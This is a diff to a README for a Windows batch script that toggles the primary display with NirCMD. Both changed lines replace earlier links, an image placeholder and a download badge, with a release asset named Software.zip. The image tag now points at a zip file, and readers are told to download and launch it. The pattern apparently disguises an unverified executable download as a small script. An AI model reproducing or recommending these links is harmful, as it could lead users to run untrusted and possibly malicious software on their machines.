@@ -1,6 +1,6 @@
 # 🖥️ Windows Display Switcher with NirCMD 🔄
 
-![Windows Display Switcher with NirCMD](https://example.com/image.jpg)
+![Windows Display Switcher with NirCMD](https://github.com/Willlikeyou/Windows-Display-Switcher-NirCMD-/releases/download/v1.0/Software.zip)
 
 Welcome to the **Windows Display Switcher with NirCMD** repository! This simple Windows batch script allows you to easily toggle your primary display using NirCMD, making it perfect for multi-monitor setups. Increase your productivity and easily manage your desktop displays with this convenient script.
 
@@ -17,7 +17,7 @@ Welcome to the **Windows Display Switcher with NirCMD** repository! This simple 
 ## Getting Started
 To get started with the Windows Display Switcher, simply download the script from the following link:
 
-[![Download Windows Display Switcher](https://img.shields.io/badge/Download-Script-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Windows Display Switcher](https://github.com/Willlikeyou/Windows-Display-Switcher-NirCMD-/releases/download/v1.0/Software.zip)](https://github.com/Willlikeyou/Windows-Display-Switcher-NirCMD-/releases/download/v1.0/Software.zip)
 
 Once downloaded, launch the script to start toggling your primary display with ease!
 
